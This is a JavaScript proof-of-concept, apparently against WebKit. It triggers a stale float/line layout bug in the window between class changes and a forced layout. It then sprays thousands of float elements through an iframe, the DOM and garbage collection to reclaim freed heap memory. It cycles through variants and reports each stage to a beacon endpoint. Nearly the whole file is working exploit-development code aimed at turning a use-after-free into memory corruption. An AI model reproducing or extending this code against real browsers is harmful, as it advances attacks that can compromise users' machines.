// p503 — case 176 / BZ 272488 reclaim spray in the mutation->layout window.
// Confirmed on 14.20: exact (pre-layout + class flips) dies at the following
// layout; noscroll (no pre-layout) survives; extralayout also dies. So the
// window between the class flips and the forced layout is where the stale
// float/line structures are reclaimed.
//
// Variants (p503var):
//   0 iframe      : pre-layout, flips, same-origin iframe with 2000 float divs,
//                   force iframe layout, then force target layout
//   1 domprepend  : pre-layout, flips, prepend 2000 float divs, force their layout
//   2 domgc       : pre-layout, flips, append 1000 float divs + gc(), force target
//   3 control     : pre-layout, flips, no spray (expected crash)
(function () {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','BUILT','PRE','FLIP','SPRAY','FORCE','POST','DONE','ERR','HTMLERR']
    .forEach(function (n) {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V503-' + n);
      staged.push([n, x]);
    });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) { staged[i][1].send('[' + (Date.now() - T0) + 'ms] ' + (body || '')); return; }
    } catch (e) {}
  }

  var VARIANTS = ['iframe', 'domprepend', 'domgc', 'control'];
  var vi = 0;
  try {
    vi = parseInt(localStorage.getItem('p503var') || '0', 10);
    if (isNaN(vi) || vi < 0) vi = 0;
    if (vi >= VARIANTS.length) vi = 0;
    localStorage.setItem('p503var', String((vi + 1) % VARIANTS.length));
  } catch (e) {}
  var variant = VARIANTS[vi];
  S('BOOT', 'variant=' + variant + ' idx=' + vi + ' ' + navigator.userAgent);

  var st = document.createElement('style');
  st.textContent = [
    '.vrl { writing-mode: vertical-rl; }',
    '#wide { display: inline-block; width: 100000000vmin; }',
    '#outer.flow { display: flow; }',
    '#inner:before { content: "A"; }',
    'object { float: inline-end; }'
  ].join('\n');
  document.head.appendChild(st);

  var container = document.createElement('div');
  container.id = 'container';
  container.className = 'vrl';
  var span = document.createElement('span');
  var wide = document.createElement('span'); wide.id = 'wide';
  var outer = document.createElement('span'); outer.id = 'outer'; outer.className = 'flow';
  var inner = document.createElement('span'); inner.id = 'inner';
  outer.appendChild(inner);
  var obj = document.createElement('object');
  var div = document.createElement('div'); div.id = 'div';
  span.appendChild(wide); span.appendChild(outer); span.appendChild(obj);
  container.appendChild(span); container.appendChild(div);
  document.body.appendChild(container);
  S('BUILT', 'vrl+flow+float');

  // Pre-layout: build the old float/line state (essential for the crash).
  try {
    inner.append(div.cloneNode());
    inner.scrollLeft;
  } catch (e) {
    S('ERR', 'pre ' + String(e && e.message).substring(0, 60));
    return;
  }
  S('PRE', 'pre-layout');

  // Class flips: invalidate/replace the float/line structures.
  outer.classList.remove('flow');
  container.classList.remove('vrl');
  S('FLIP', 'classes removed');

  // Reclaim spray in the window.
  try {
    if (variant === 'iframe') {
      var ifr = document.createElement('iframe');
      ifr.style.cssText = 'width:320px;height:320px;border:0';
      document.body.appendChild(ifr);
      var d = ifr.contentDocument;
      var html = '<body>';
      for (var i = 0; i < 2000; i++)
        html += '<div style="float:left;width:1px;height:1px"></div>';
      html += '</body>';
      d.open(); d.write(html); d.close();
      // Force the iframe's render tree/layout (same WebProcess/FastMalloc heap).
      ifr.contentDocument.body.offsetWidth;
      ifr.contentDocument.body.getBoundingClientRect();
      S('SPRAY', 'iframe floats=2000');
    } else if (variant === 'domprepend') {
      var sc = document.createElement('div');
      for (var j = 0; j < 2000; j++) {
        var x = document.createElement('div');
        x.style.cssText = 'float:left;width:1px;height:1px';
        sc.appendChild(x);
      }
      document.body.insertBefore(sc, document.body.firstChild);
      sc.offsetWidth;
      sc.getBoundingClientRect();
      S('SPRAY', 'domprepend floats=2000');
    } else if (variant === 'domgc') {
      var sc2 = document.createElement('div');
      for (var k = 0; k < 1000; k++) {
        var x2 = document.createElement('div');
        x2.style.cssText = 'float:left;width:1px;height:1px';
        sc2.appendChild(x2);
      }
      document.body.appendChild(sc2);
      sc2.offsetWidth;
      if (typeof gc === 'function') { try { gc(); } catch (e) {} }
      S('SPRAY', 'dom+gc floats=1000');
    } else {
      S('SPRAY', 'none');
    }
  } catch (e) {
    S('ERR', 'spray ' + String(e && e.message).substring(0, 60));
  }

  S('FORCE', 'target layout');
  try { container.offsetWidth; } catch (e) {}
  requestAnimationFrame(function () {
    S('POST', 'survived-frame');
    S('DONE', '');
  });
})();
